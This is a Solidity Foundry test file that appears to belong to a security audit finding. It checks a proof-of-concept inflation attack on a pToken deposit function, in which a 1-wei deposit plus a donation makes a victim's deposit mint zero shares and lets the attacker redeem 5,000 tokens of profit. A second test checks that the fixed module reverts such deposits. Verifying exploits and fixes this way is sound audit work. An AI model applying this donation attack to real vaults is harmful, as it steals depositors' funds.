// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Underlying, PTokenModuleFixed, PikeVictimFixed} from
    "./62693-inflation-attack-in-ptokenmoduledeposit-draining-initial-dep.sol";

contract Finding62693Test is Test {
    function test_exploit_deposit_mints_zero_ptokens() public {
        Exploit e = new Exploit();
        uint256 start = e.token().balanceOf(address(e));
        e.run();
        assertEq(start, 5_000e18 + 1, "started with 1 wei plus donation");
        assertEq(e.token().balanceOf(address(e)), 10_000e18 + 1, "redeemed all cash");
        assertEq(e.token().balanceOf(address(e)) - start, 5_000e18, "profit 5000");
        assertEq(e.pToken().balanceOf(address(e.victim())), 0, "victim minted 0");
    }

    function test_control_requires_positive_ptokens() public {
        Underlying token = new Underlying();
        PTokenModuleFixed pToken = new PTokenModuleFixed(token);
        PikeVictimFixed victim = new PikeVictimFixed(token, pToken);
        token.mint(address(this), 5_000e18 + 1);
        token.mint(address(victim), 5_000e18);
        token.approve(address(pToken), type(uint256).max);
        pToken.deposit(1);
        token.transfer(address(pToken), 5_000e18);

        bool deposited = true;
        try victim.deposit(5_000e18) {
            deposited = true;
        } catch {
            deposited = false;
        }
        assertFalse(deposited, "zero pTokens revert");
        assertEq(token.balanceOf(address(victim)), 5_000e18, "victim kept 5000");
        uint256 out = pToken.redeem(1);
        assertEq(out, 5_000e18 + 1, "only the donation comes back");
    }
}
